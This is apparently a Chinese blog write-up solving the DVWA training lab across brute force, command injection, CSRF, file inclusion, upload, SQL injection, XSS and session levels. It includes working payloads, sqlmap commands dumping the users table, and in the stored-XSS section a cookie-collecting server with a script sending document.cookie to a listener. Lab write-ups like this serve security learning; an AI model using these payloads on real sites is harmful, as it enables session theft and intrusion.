---
icon: pen-to-square
date: 2025-03-14
tags: 
title: DVWA
category:
  - 项目
---
# 前言
## **set up**
```bash
Downloading DVWA from GitHub...
Cloning into '/var/www/html/DVWA'...
remote: Enumerating objects: 5105, done.
remote: Counting objects: 100% (91/91), done.
remote: Compressing objects: 100% (24/24), done.
remote: Total 5105 (delta 79), reused 67 (delta 67), pack-reused 5014 (from 4)
Receiving objects: 100% (5105/5105), 2.49 MiB | 2.08 MiB/s, done.
Resolving deltas: 100% (2489/2489), done.
MariaDB service is already enabled.
MariaDB service is already running.

Default credentials:
Username: root

Password: [No password just hit Enter]
Enter SQL user: root
Enter SQL password (press Enter for no password):
SQL commands executed successfully.
Configuring DVWA...
Configuring permissions...
Configuring PHP...
Apache service is already enabled.
Restarting Apache...
DVWA has been installed successfully. Access http://localhost/DVWA to get started.
Credentials:
Username: admin
Password: password

With ♡ by IamCarron
root@ubantuu:~# ls
mc  path  vulhub
root@ubantuu:~#

```
docker共享文件夹
```bash
sudo bash -c "$(curl --fail --show-error --silent --location https://raw.githubusercontent.com/IamCarron/DVWA-Script/main/Install-DVWA.sh)"
```

## brute Force
### low
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314193624.png)
这题可以字典攻击
用集群炸弹攻击，会遍历所有排列
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314193938.png)
如果用pitchfork攻击，是这样的排列，按照字典的排列
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314194133.png)
简单列表就很奇怪了，只会插入一个payload位置
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314194626.png)
碰撞攻击会为每一个payload使用同一个字典
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314194822.png)


然后构造字典，实际情况会更复杂，花费的时间也更多
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314194045.png)

![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314194441.png)
成功的组合长度是不同的
还有sql注入的方面也可以攻破此关
```sql
$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
```
源码的sql逻辑很简单，我们只需要
构建这样的payload即可通过
`user;` admin' or '1='1

### Medium
中等难度会睡两秒钟然后再继续进行
并且添加了简单的防sql注入的代码
```php
$user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
```
- `((isset($GLOBALS["___mysqli_ston"])`:检查全局变量 `$GLOBALS` 中是否存在名为 `___mysqli_ston` 的键。
-  `is_object($GLOBALS["___mysqli_ston"])`作用：验证 `$GLOBALS["___mysqli_ston"]` 是否为对象。确保数据库连接是一个有效的 `mysqli` 对象（而非字符串、数组等）。
 **`mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $user)`**

- **作用**：对字符串 `$user` 进行转义，使其安全嵌入SQL语句。
- **参数**：
    - `$GLOBALS["___mysqli_ston"]`：数据库连接对象。
    - `$user`：待转义的原始输入（如用户提交的用户名）。
- **返回值**：转义后的安全字符串（如 `O\'Brien` 转义为 `O\\\'Brien`）。
- #### **`trigger_error(message, E_USER_ERROR)`**
- **作用**：主动触发一个用户级别的致命错误（Fatal Error）。说明数据库连接无效
?代表前边的两个条件双与条件，:代表成立会指向:前面的语句，不成立会执行后面的语句
再爆破一下即可
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319153958.png)

### High
发现在构造的数据包出现了`user_token`字段
然后进行重传，发现不能够进行重传，返回302
在传回的http中发现了隐藏value字段很像token
- 在服务端会生成session，发送到客户端，然后客户端在进行操作时需要携带session，这种处理方式可以抵御重放攻击
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319160137.png)
那么，我们在intruder设置一下
先设置pitchfork攻击
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319160952.png)
然后设置第三个注入点
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319161123.png)
设置检索提取，并键入规则：从`value='`之后`'`之前进行匹配
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319161213.png)
然后设置首次初始payload为刚才设置提取的返回的vlaue即可
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319161549.png)
设置重定向为总是，在每次收到token时会更新
然后分别为字段1和2设置爆破字典列表
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319162201.png)
成功！

![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319162045.png)



## Command Injection
### low
& ：前面一个命令无论是否执行，后面的命令都能执行，两个命令都执行  
- 似乎会同时执行两个命令
&&：前面一个命令执行成功后，才能执行后面一个命令，两个命令都执行  
- 等待前一个命令执行后才会执行下一个命令
|：前面一个命令无论是否执行，后面的命令都能执行且    **只执行后面一个**  

||：前面一个命令不能正常执行后，才能执行后面一个命令

；:跟&&的原理差不多
看看源码
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314200721.png)
可以发现会将"ping"直接拼接到我们的"地址"上
我们可以利用这个进行上面的命令拼接符进行攻击，执行危险操作
### Medium
```php
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );
```
简单的过滤了一些命令分隔符
```php
$target = str_replace( array_keys( $substitutions ), $substitutions, $target );
```
会将$target中的与`substitutions`键的匹配的内容替换为值的内容
不过没有过滤`|`和`||``&`等
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319164020.png)
### High
```php
    $substitutions = array(
        '||' => '',
        '&'  => '',
        ';'  => '',
        '| ' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
    );
```
这关过滤了几乎所有的命令分隔符
但是发现`| `有一个空格，那么我们直接用|进行请求即可
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319164550.png)


## CSRF（跨站请求伪造）
### low
```php
$pass = $_GET[ 'password' ];
```

这是一切问题的根源，这段代码说明了包含修改密码的请求包可以在url中集成，意味着攻击者可以通过这个url构建一个按钮，访问这个页面，在不知不觉中造成密码更改
```url
http://192.168.254.128/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change#
```

### Medium
```php
if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
```
这个函数会检查http请求头的refer字段是否为服务器的名字，我们只需要在bp中加入对应的refer字段即可
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319171143.png)

### High
```php
if ($change) {
    // Check Anti-CSRF token
    checkToken( $token, $_SESSION[ 'session_token' ], 'index.php' );
```
会检查cookie是否正确
我们需要再每次构建url时把新的token传入
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319174320.png)


## File Inclusion
### low
文件包含漏洞，可移植性任意文件，包括服务器本地文件和远程文件
```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

?>


```

![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314204935.png)
没有对文件做过滤并且会返回文件路径，
```
192.168.254.128/DVWA/vulnerabilities/fi/?page=http://127.0.0.1/DVWA/phpinfo.php
```


### Medium
```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\\" ), "", $file );

?>
```
`str_replace( array( "http://", "https://" ), "", $file );`:这个函数会将htt://p和https://替换为空格，遇到这类的替换函数我们可以用双写绕过
```url
http://192.168.254.128/DVWA/vulnerabilities/fi/?page=htthttp://p://192.168.254.128/DVWA/login.php
```
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319215554.png)


### High
```php
$file = $_GET[ 'page' ];

// Input validation
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
```
在输入的参数存在file开头的语句时，会返回true，否则为false，同时，检测到file不为include.php时为true
尝试包含ma.php
```
**Warning**: include(file:///root/ma.php): Failed to open stream: Permission denied in **/var/www/html/DVWA/vulnerabilities/fi/index.php** on line **36**  
  
**Warning**: include(): Failed opening 'file:///root/ma.php' for inclusion (include_path='.:/usr/share/php') in **/var/www/html/DVWA/vulnerabilities/fi/index.php** on line **36**
```
发现没有权限(笑)
`chmod +x ...`一路绿灯终于成功
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319222121.png)


=======

## File upload

### low
```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // Can we move the file to the upload folder?
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        // No
        echo '<pre>Your image was not uploaded.</pre>';
    }
    else {
        // Yes!
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
}

?>
```
没有过滤文件类型，直接上传即可
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250320170315.png)


## Vulnerability: Insecure CAPTCHA
```php
<?php

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) {
    // Hide the CAPTCHA form
    $hide_form = true;

    // Get input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];

    // Check CAPTCHA from 3rd party
    $resp = recaptcha_check_answer(
        $_DVWA[ 'recaptcha_private_key'],
        $_POST['g-recaptcha-response']
    );

    // Did the CAPTCHA fail?
    if( !$resp ) {
        // What happens when the CAPTCHA was entered incorrectly
        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
        $hide_form = false;
        return;
    }
    else {
        // CAPTCHA was correct. Do both new passwords match?
        if( $pass_new == $pass_conf ) {
            // Show next stage for the user
            echo "
                <pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre>
                <form action=\"#\" method=\"POST\">
                    <input type=\"hidden\" name=\"step\" value=\"2\" />
                    <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" />
                    <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" />
                    <input type=\"submit\" name=\"Change\" value=\"Change\" />
                </form>";
        }
        else {
            // Both new passwords do not match.
            $html     .= "<pre>Both passwords must match.</pre>";
            $hide_form = false;
        }
    }
}

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
    // Hide the CAPTCHA form
    $hide_form = true;

    // Get input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];

    // Check to see if both password match
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the end user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with the passwords matching
        echo "<pre>Passwords did not match.</pre>";
        $hide_form = false;
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```
看代码,这些是step1的内容
```php
if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) {
    $hide_form = true; // 隐藏表单，仅显示后续内容
    $pass_new  = $_POST[ 'password_new' ];  // 获取新密码
    $pass_conf = $_POST[ 'password_conf' ]; // 获取确认密码

    // 调用第三方CAPTCHA验证接口
    $resp = recaptcha_check_answer(
        $_DVWA[ 'recaptcha_private_key'], // 从配置获取私钥
        $_POST['g-recaptcha-response']    // 用户提交的CAPTCHA响应
    );

    if( !$resp ) { // CAPTCHA验证失败
        $html .= "<pre>CAPTCHA错误，请重试。</pre>";
        $hide_form = false; // 重新显示表单
        return; // 终止后续逻辑
    } else { // CAPTCHA验证成功
        if( $pass_new == $pass_conf ) { // 检查密码是否一致
            // 生成确认表单（跳转Step 2）
            echo "
                <form action=\"#\" method=\"POST\">
                    <input type=\"hidden\" name=\"step\" value=\"2\" />
                    <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" />
                    <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" />
                    <input type=\"submit\" name=\"Change\" value=\"确认修改\" />
                </form>";
        } else { // 密码不一致
            $html .= "<pre>密码不匹配。</pre>";
            $hide_form = false;
        }
    }
}
```
逻辑是这样的
检查字段step是否为1，检查CAPTCHA和两次密码相同通过后会再次发送一个step2的html

```php
if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
    $hide_form = true; // 隐藏表单
    $pass_new  = $_POST[ 'password_new' ];  // 从隐藏字段获取密码
    $pass_conf = $_POST[ 'password_conf' ]; 

    if( $pass_new == $pass_conf ) { // 再次检查密码一致性
        // 转义密码（防SQL注入）
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) 
            ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $pass_new) 
            : trigger_error("数据库连接错误", E_USER_ERROR);
        
        $pass_new = md5( $pass_new ); // 使用MD5哈希密码

        // 构造SQL语句更新密码
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"], $insert) 
            or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' ); // 错误处理

        echo "<pre>密码修改成功。</pre>";
    } else { // 密码不一致
        echo "<pre>密码不匹配。</pre>";
        $hide_form = false;
    }

    mysqli_close($GLOBALS["___mysqli_ston"]); // 关闭数据库连接
}
```

第二次不检查CAPTCHA之类的信息，直接将密码传入数据库并修改
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319150655.png)
改变这个step即可直接跳过人机验证
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319150741.png)
更改成功

### Medium
```php
 if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
```
这个会检查MIME头
然后一切跟上题一样

### High
```php
    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
        ( $uploaded_size < 100000 ) &&
        getimagesize( $uploaded_tmp ) ) {
```
getimagesize：必须得是图片内容
添加了白名单验证，但是发现关于$uploaded_ext具有漏洞
```php
$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
```
strrpos()会查找最后一个`.`的位置，并返回索引
substr()会根据后面的索引分离这个索引+1以及(包括+1索引)以后的内容


=======
## SQL Injection (Blind)
^use-sqlmap
先测试正常回显,输入1
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315111850.png)
然后输入-1
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315112001.png)
这里的逻辑
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315112027.png)
返回值不为0(不为false)时才会回显exists
那么很好办了，常规的布尔盲注
测试闭合,1'显示miss，1“显示exists，意味着闭合为'
用length(database())试数据库大小，到4时为正确 ^d5e614
```
1' and length(database())=4 #
```
然后使用sqlmap，注意cookie是这个
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315120605.png)
示例命令
```bash
sqlmap -u "http://192.168.254.128/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "PHPSESSID=vu5afsp2gm4hnrcib72jbhf2v1; security=low" --current-db
```
注意--cookie的值需要双引号框住[[sql注入#^sqlmap|sqlmap教程]]
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315122048.png)
成功爆库名
继续爆库名
```bash
sqlmap -u "http://192.168.254.128/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "PHPSESSID=vu5afsp2gm4hnrcib72jbhf2v1; security=low" -D dvwa --tables
```
- `-D`: 指定库名
- 爆表名
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315122434.png)
比刚才快很多
```bash
sqlmap -u "http://192.168.254.128/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "PHPSESSID=vu5afsp2gm4hnrcib72jbhf2v1; security=low" -D dvwa -T users --dump --batch
```
- --batch:不再询问确认
- --dump：爆数据
- -D dvwa -T users：指定已知数据
还是比较快的
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315123803.png)
成功
## XSS(Reflected)
反射型xss

XSS漏洞的本质在于弹到网页的用户输入的内容，如果没有过滤用javascript闭合就会造成脚本执行，会造成用户信息泄露等危害
验证是否有XSS的实例
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315124529.png)

```html
<script>alert('hack')</script>
```
回显，验证有XSS注入漏洞
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315124722.png)
网页代码中的位置
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315125731.png)


======

----
## XSS(Stored)

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import json
class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urlparse(self.path)
        query_params = parse_qs(parsed_path.query)
        query_params = parse_qs(parsed_path.query)
         # 打印请求信息到控制台
        # print(f"\n[请求路径] {parsed_path.path}")
        # print(f"[查询参数] {json.dumps(query_params, indent=2)}")
        if "cookie" in query_params:
            print(f"已收集到cookie")
            print(f"[Cookie] {query_params['cookie'][0]}"+"\n")
        # print("[请求头]")
        # for header, value in self.headers.items():
        #     print(f"  {header}: {value}")
            # 发送响应
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.send_header('Content-Length', '0')
        self.end_headers()
if __name__ == '__main__':
    server_address = ('', 7989)
    httpd = HTTPServer(server_address, RequestHandler)
    print("服务器已启动，监听端口 7989...")
    httpd.serve_forever()
```


写了一个简单的发送脚本
```javascript
<script>   var url = 'http://127.0.0.1:14444?cookie=' + encodeURIComponent(document.cookie);   var xhr = new XMLHttpRequest();   xhr.open('GET', url, true);   xhr.send(); </script>
```

![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250317221248.png)

-----

## XSS（DOM）
DOM：DOM（Document Object Model）即文档对象模型，是W3C制定的标准接口规范，是一种处理HTML和XML文件的标准API。DOM提供了对整个文档的访问模型，将文档作为一个树形结构，树的每个结点表示了一个HTML标签或标签内的文本项。DOM树结构精确地描述了HTML文档中标签间的相互关联性。将HTML或XML文档转化为DOM树的过程称为解析(parse)。HTML文档被解析后，转化为DOM树，因此对HTML文档的处理可以通过对DOM树的操作实现。

![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250318191921.png)
可以发现url带有default参数，我们可以在这里执行命令

## JavaScript

提示输入success，但是提示错误

直接看源码,似乎先执行generate_token()，导致只会将ChangeMe的MD5
rot15内容写入id='token'
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250318202718.png)
这里引入了外部库MD5哈希库

```js
!function(n){...}(this);
```
这是ROT13 编码函数
```js
function rot13(inp) {
    return inp.replace(/[a-zA-Z]/g,function(c){
        return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);
    });
}
```
生成Token的逻辑
```js
function generate_token() {
    var phrase = document.getElementById("phrase").value; //- 从页面中取 `id="phrase"` 的输入框的值（用户输入）。
    
    document.getElementById("token").value = md5(rot13(phrase));
    '''
    - 对输入值依次进行 **ROT13 编码** → **MD5 哈希**。
	- 将结果写入 `id="token"` 的输入框。
    '''
}
generate_token();
```
那么，我们先确保phrase为su运行generate_token();将其写入隐藏的id='token'输入框，之后再进行传参即可
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250318203059.png)
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250318203206.png)


----
### Authorisation Bypass
先记住这个界面的url
```url
http://192.168.254.128/DVWA/vulnerabilities/authbypass/
```
切换普通用户
发现没有那一行了
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319100848.png)
访问之前复制的url
成功绕过
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319100955.png)

## Open HTTP Redirect
先看代码
```php
<?php

if (array_key_exists ("redirect", $_GET) && $_GET['redirect'] != "") {
    header ("location: " . $_GET['redirect']);
    exit;
}

http_response_code (500);
?>
<p>Missing redirect target.</p>
<?php
exit;
?>
```
本题先if判断
```php
if (array_key_exists ("redirect", $_GET) && $_GET['redirect'] != "") {
```
- 判断redirect键是否存在且不为空


```php
header ("location: " . $_GET['redirect']);
```
- **`header()`**：这是PHP的一个函数，用于发送原始HTTP头信息。在这里，它用于发送一个HTTP头，告诉浏览器进行页面跳转。
- **`"location: " . $_GET['redirect']`**：设置HTTP头的`Location`字段，其值为`$_GET['redirect']`的值。
```url
192.168.254.128/DVWA/vulnerabilities/open_redirect/source/low.php?redirect=
```
构造这样的url，之后的redirect传入网址即可进行任意网站访问
## Weak Session IDS
```php
<?php

$html = "";

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    if (!isset ($_SESSION['last_session_id'])) {
        $_SESSION['last_session_id'] = 0;
    }
    $_SESSION['last_session_id']++;
    $cookie_value = $_SESSION['last_session_id'];
    setcookie("dvwaSession", $cookie_value);
}
?>
```
每当post被触发时源码中会获取现在的session，然后会+1
我们就可以进行，没错，我们在清除浏览器缓存后，用这个session进行越权登录